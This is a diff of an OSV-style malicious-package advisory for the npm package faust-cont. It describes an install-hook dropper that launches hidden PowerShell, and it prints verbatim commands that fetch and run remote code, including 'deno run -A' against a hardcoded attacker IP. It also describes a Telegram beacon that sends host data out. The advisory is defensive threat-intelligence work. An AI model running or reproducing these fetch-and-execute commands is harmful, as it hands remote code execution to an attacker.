@@ -1,34 +1,56 @@
 {
-  "modified": "2026-07-21T00:00:00Z",
-  "published": "2026-07-21T00:00:00Z",
   "schema_version": "1.7.4",
   "id": "MAL-2026-11042",
+  "published": "2026-07-21T00:00:00Z",
+  "modified": "2026-08-04T21:35:10.669237933Z",
   "summary": "Malicious code in faust-cont (npm)",
-  "details": "The npm package `faust-cont` is a supply-chain dropper disguised as a benign CLI tool (`index.js` is a decoy that only logs \"cli tool install package loaded\"). The real behaviour is placed in an install script.\n\nAn `install` lifecycle hook (`install: node install.js`) executes automatically on `npm install`, before the package is ever imported. On Windows the install script writes a PowerShell script to `%TEMP%\\setup.ps1` and launches it hidden and detached (`powershell -WindowStyle Hidden -ExecutionPolicy Bypass`). That script bootstraps a runtime toolchain so execution succeeds on a clean host — it installs scoop (`irm get.scoop.sh | iex`), then winget, then Deno — and finally runs `deno run -A http://172.94.9.157/v028f8cde892b0b74c8.js`, fetching and executing a remote module from a hardcoded raw IP over plain HTTP with all Deno permissions granted (filesystem, network, environment, subprocess). Per the dropper's own comments the remote stage is a server-compiled loader that pulls a second stage which sets up autorun persistence and runs a main payload. The install script also contains a Telegram Bot API beacon that reports OS / architecture / hostname on install (the bot token is blank in the published build). Any Windows workstation or CI runner that installs the package (directly or transitively) hands all-permission remote code execution to the operator.\n\nDetected and classified independently by codelake Research from the npm feed on 2026-07-21; at the time of reporting the package was not present in OSV or GHSA (a first-catch). The package was already unpublished from npm by the time of analysis; the artifact is preserved in the codelake archive.",
+  "details": "The npm package `faust-cont` is a supply-chain dropper disguised as a benign CLI tool (`index.js` is a decoy that only logs \"cli tool install package loaded\"). The real behaviour is placed in an install script.\n\nAn `install` lifecycle hook (`install: node install.js`) executes automatically on `npm install`, before the package is ever imported. On Windows the install script writes a PowerShell script to `%TEMP%\\setup.ps1` and launches it hidden and detached (`powershell -WindowStyle Hidden -ExecutionPolicy Bypass`). That script bootstraps a runtime toolchain so execution succeeds on a clean host — it installs scoop (`irm get.scoop.sh | iex`), then winget, then Deno — and finally runs `deno run -A http://172.94.9.157/v028f8cde892b0b74c8.js`, fetching and executing a remote module from a hardcoded raw IP over plain HTTP with all Deno permissions granted (filesystem, network, environment, subprocess). Per the dropper's own comments the remote stage is a server-compiled loader that pulls a second stage which sets up autorun persistence and runs a main payload. The install script also contains a Telegram Bot API beacon that reports OS / architecture / hostname on install (the bot token is blank in the published build). Any Windows workstation or CI runner that installs the package (directly or transitively) hands all-permission remote code execution to the operator.\n\nDetected and classified independently by codelake Research from the npm feed on 2026-07-21; at the time of reporting the package was not present in OSV or GHSA (a first-catch). The package was already unpublished from npm by the time of analysis; the artifact is preserved in the codelake archive.\n\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (6ecd29d4c7b48237d28a9433bcfea361da155e1ed4ebdef265fd661574fe1a5d)\nThe package's npm install lifecycle hook runs install.js, which writes a PowerShell script to %TEMP%\\setup.ps1 and launches it via `start /min powershell -WindowStyle Hidden -ExecutionPolicy Bypass` with windowsHide and detached options. The PowerShell script installs the Deno runtime (via winget/scoop) and then invokes `deno run -A http://172.94.9.157/v028f8cde892b0b74c8.js`, fetching unpinned JavaScript from a bare IP over plain HTTP and executing it with all Deno permissions on the installer's Windows host. Separately, install.js collects OS name, architecture, and hostname and POSTs them to a hardcoded api.telegram.org bot endpoint (bot token and chat_id constants are blank in this published artifact, but the exfil path is fully wired and fires unconditionally). Hidden-window and detached execution deliberately conceal the dropper from the installing user.\n",
   "affected": [
     {
       "package": {
-        "ecosystem": "npm",
-        "name": "faust-cont"
+        "name": "faust-cont",
+        "ecosystem": "npm"
       },
       "versions": [
         "1.0.0"
-      ]
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "indicators": {
+          "evidence_files": [
+            {
+              "path": "install.js",
+              "sha256": "d06919a5eace0256f81324e6e08c71eb8284f4c7f4af91d24a50d2d11dd50342",
+              "tlsh": "1d7141c423f5c2e647726fb2b5d2a60ae22e80297213d390f4ac41c13fa1969c7a1ddd"
+            }
+          ],
+          "package_integrity": [
+            {
+              "filename": "faust-cont-1.0.0.tgz",
+              "hashes": {
+                "sha1": "4df9e3bd4a0bd7989c2ba65c4e0ca547f724ad91",
+                "sha512_sri": "sha512-b65pG7CW7EelTQKGt3MTwjq96/DaKLKADCfnW1qIavUH8vza1jWw37BbceZhjqZylRONHKvFs7iwSlUJuanRvg=="
+              }
+            }
+          ]
+        }
+      }
     }
   ],
   "references": [
     {
       "type": "ADVISORY",
       "url": "https://research.codelake.dev/advisories/clr-2026-3040-faust-cont"
-    }
-  ],
-  "credits": [
+    },
     {
-      "name": "codelake Research",
-      "type": "FINDER",
-      "contact": [
-        "https://research.codelake.dev/advisories/clr-2026-3040-faust-cont"
-      ]
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/faust-cont/v/1.0.0"
     }
   ],
   "database_specific": {
@@ -45,6 +67,33 @@
         "http://172.94.9.157/v028f8cde892b0b74c8.js"
       ]
     },
-    "malicious-packages-origins": null
-  }
+    "malicious-packages-origins": [
+      {
+        "id": "IN-MAL-2026-011044",
+        "import_time": "2026-08-04T21:33:14.880902826Z",
+        "modified_time": "2026-08-04T21:24:22Z",
+        "sha256": "6ecd29d4c7b48237d28a9433bcfea361da155e1ed4ebdef265fd661574fe1a5d",
+        "source": "amazon-inspector",
+        "versions": [
+          "1.0.0"
+        ]
+      }
+    ]
+  },
+  "credits": [
+    {
+      "name": "Amazon Inspector",
+      "contact": [
+        "inspector-research@amazon.com"
+      ],
+      "type": "FINDER"
+    },
+    {
+      "name": "codelake Research",
+      "contact": [
+        "https://research.codelake.dev/advisories/clr-2026-3040-faust-cont"
+      ],
+      "type": "FINDER"
+    }
+  ]
 }
